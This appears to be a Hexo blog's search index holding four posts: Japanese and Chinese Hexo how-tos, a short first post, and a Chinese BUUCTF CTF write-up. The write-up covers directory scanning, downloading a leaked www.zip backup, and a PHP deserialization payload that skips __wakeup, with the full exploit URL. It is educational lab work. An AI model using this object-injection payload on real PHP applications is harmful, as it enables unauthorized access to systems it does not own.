<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hexoで記事を投稿する</title>
      <link href="/2025/05/15/hexo%E3%81%A7%E8%A8%98%E4%BA%8B%E3%82%92%E6%8A%95%E7%A8%BF%E3%81%99%E3%82%8B/"/>
      <url>/2025/05/15/hexo%E3%81%A7%E8%A8%98%E4%BA%8B%E3%82%92%E6%8A%95%E7%A8%BF%E3%81%99%E3%82%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="1-ファイル-config-ymlで設定変更（おすすめ）"><a href="#1-ファイル-config-ymlで設定変更（おすすめ）" class="headerlink" title="1.ファイル_config.ymlで設定変更（おすすめ）"></a>1.ファイル_config.ymlで設定変更（おすすめ）</h3><p>この手順を行うと、新しい記事を作成するたびに、その記事のフォルダが同時に生成されます。しなくても記事に影響ないけど、管理しやすくなるのでお勧めです。</p><p>_config.ymlを開いて、post_asset_folderをtrueに設定します。</p><pre><code>post_asset_folder: true</code></pre><hr><h3 id="2-新しい記事を作成する"><a href="#2-新しい記事を作成する" class="headerlink" title="2.新しい記事を作成する"></a>2.新しい記事を作成する</h3><p>ブログのディレクトリで、git bashを開き、次のコマンドを実行します。</p><pre><code>hexo new 記事名</code></pre><p>これで&#x2F;source&#x2F;_posts&#x2F;フォルダの中に、「記事名.md」というmarkdownファイルが生成されます。このファイルで記事を編集することができます。</p><p>手順1をしたのなら、「記事名」というフォルダも同時に生成されます。記事の画像とかを入れるとより便利に管理できます。</p><hr><h3 id="3-記事に画像を入れる（必要があれば）"><a href="#3-記事に画像を入れる（必要があれば）" class="headerlink" title="3.記事に画像を入れる（必要があれば）"></a>3.記事に画像を入れる（必要があれば）</h3><p>hexoドキュメントによると、<a href="https://github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a>をインストールする必要があります。</p><p>git bashで次のコマンドを実行します。</p><pre><code>npm install hexo-renderer-marked --save</code></pre><p>そしたら、mdファイルで画像を挿入したいところでMarkdownの文法を使用して画像を挿入することができます。</p><p>手順1をしたのなら、以下の構造になります。</p><pre><code>![](記事名/画像.png)</code></pre><hr><h3 id="4-作成した記事をローカルプレビューする"><a href="#4-作成した記事をローカルプレビューする" class="headerlink" title="4.作成した記事をローカルプレビューする"></a>4.作成した記事をローカルプレビューする</h3><p>Git Bashで次のコマンドを実行したら、作成した記事を<code>http://localhost:4000/</code>でローカルプレビューできます。</p><pre><code>hexo s</code></pre><hr><h3 id="5-記事をGithubにアップロードする"><a href="#5-記事をGithubにアップロードする" class="headerlink" title="5.記事をGithubにアップロードする"></a>5.記事をGithubにアップロードする</h3><p>記事がローカルサーバーで正しく表示されたら、Git Bashで次のコマンドを実行します。</p><pre><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>ブラウザで自分のブログドメインにアクセスすると、投稿された記事が表示されます。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Japanese </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo插入本地图片不显示问题</title>
      <link href="/2025/05/01/Hexo%E6%8F%92%E5%85%A5%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/"/>
      <url>/2025/05/01/Hexo%E6%8F%92%E5%85%A5%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>几乎尝试了所有中文博客提供的方法，但还是没解决，于是回头去看Hexo文档，找到解决方法，步骤如下：</p><p>1.安装<a href="https://github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a></p><pre><code>$ npm install hexo-renderer-marked --save</code></pre><p>2.在需要插入图片的地方使用Markdown语法插入图片</p><pre><code>![](pictures/1.png)</code></pre><p>问题解决。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF[极客大挑战 2019]PHP</title>
      <link href="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/"/>
      <url>/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/</url>
      
        <content type="html"><![CDATA[<p>最近在做BUUCTF上的题，虽然很老了但是因为是新手所以偶尔遇到不太细节的Writeup还是会想自己写一份。</p><p>点开题目，会发现一只会跟着鼠标动的猫猫。</p><p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png"></p><p>查看页面源代码及BurpSuite拦截均未发现异常，那只好来扫一下目录了！</p><p>首先使用dirsearch</p><pre><code>python3 dirsearch.py -u http://eaa995f8-86f5-4e8c-a252-b6d8bf44649d.node5.buuoj.cn:81/</code></pre><p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png"></p><p>没有找到一个200…换dirmap试试。</p><pre><code>python3 dirmap.py -i http://eaa995f8-86f5-4e8c-a252-b6d8bf44649d.node5.buuoj.cn:81/ -lcf</code></pre><p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png"></p><p>找到<a href="http://www.zip，这一定就是题目里说的备份文件吧，访问一下看看。在url后面添加文件名：">www.zip，这一定就是题目里说的备份文件吧，访问一下看看。在url后面添加文件名：</a></p><pre><code>http://84776cc0-e25d-4fa2-9322-eee0da67049d.node5.buuoj.cn:81/www.zip</code></pre><p>居然直接下载下来了，打开发现里面有这样几个文件：</p><p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png"></p><p>打开flag.php看看，发现不是正经flag。</p><p>看看剩下几个吧，先来看看index.php</p><p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png"></p><p>发现这样一段PHP代码，引入了class.php，并且从 URL 的查询参数中获取名为 select 的值，赋值给变量 $select，最后进行了反序列化。</p><p>那继续来看看class.php：</p><p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png"></p><p>可以发现当username &#x3D; ‘admin’, password &#x3D; 100时，调用__destruct()可以得到flag。</p><p>那么我们考虑手动满足这一条件。php代码如下：</p><pre><code>&lt;?phpclass Name&#123;    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;&#125;$a = new Name(&#39;admin&#39;, 100);var_dump(serialize($a));?&gt;</code></pre><p>运行结果（序列化后的字符串）如下：</p><pre><code>&quot;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;&quot;</code></pre><p>（P.S.看别人的Writeup的时候发现了php在线运行工具这样一个好用的东西，推荐）</p><p>可以注意到class Name中还有一个wakeup()方法，这个方法会把我们的username重新赋值为’guest’，需要考虑如何绕过</p><p>正常来说在反序列化过程中，会先调用wakeup()方法再进行unserilize()，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。（参考：<a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结</a>）</p><p>(对于序列化与反序列化不熟悉的可以看一下这个帖子：<a href="https://www.cnblogs.com/kengwang/p/17842320.html">[CTF&#x2F;Web] PHP 反序列化学习笔记</a>)</p><p>于是将字符串更改为这样：</p><pre><code>&quot;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;&quot;</code></pre><p>然后由于声明变量时使用的是private，而私有字段的字段名在序列化时，字段名前面会加上<code>\0（即%00）</code>的前缀</p><p>所以最终的payload是这样的：</p><pre><code>&quot;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;&quot;</code></pre><p>塞进URL中是这样：</p><pre><code>http://3f140ebb-8705-4836-9dab-70e3e5cd904f.node5.buuoj.cn:81/?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</code></pre><p>拿到flag</p><p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个测试</title>
      <link href="/2025/02/14/%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95/"/>
      <url>/2025/02/14/%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>我的第一篇博客^-^</p><p>之后也会经常更新的（以平均一天0篇的速度?（逃））</p><p>不过如果一年发182篇博客平均下来一天也只发了0.499篇所以可以四舍五入为0呢（？</p><hr><style>hr {  border-style: none !important;  border-top-width: 5px !important;}hr:nth-of-type(1) {  border-top-style: dotted !important;}</style><p>编辑于 2025&#x2F;04&#x2F;23：<br>等下这篇居然是在情人节发的？好神秘的时间啊笑<br>隔壁家叔叔情人节了还在写博客，你可不要像他一样.jpg</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
